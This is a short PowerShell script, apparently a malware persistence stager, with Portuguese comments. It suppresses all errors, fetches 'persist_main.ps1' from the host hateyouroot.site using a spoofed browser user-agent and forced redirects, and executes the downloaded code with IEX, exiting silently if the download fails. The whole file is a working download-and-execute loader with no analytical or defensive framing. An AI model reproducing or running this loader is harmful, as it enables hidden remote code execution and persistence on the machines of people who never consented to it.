# persist.ps1 - VERSÃO ANTI-308 (REDIRECT FORÇADO)
$ErrorActionPreference = "SilentlyContinue"

# Função para download com redirect automático (FORÇA 308 → 301 → 200)
function Get-RemoteScript {
    param([string]$Url)
    try {
        $request = [System.Net.WebRequest]::Create($Url)
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 10
        $request.Timeout = 15000
        $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object IO.StreamReader($stream)
        $content = $reader.ReadToEnd()
        $reader.Close(); $response.Close()
        return $content
    } catch { return $null }
}

# Baixa o script principal (com redirect fix)
$main = Get-RemoteScript -Url "http://hateyouroot.site/persist_main.ps1"
if($main) { IEX $main } else { exit }
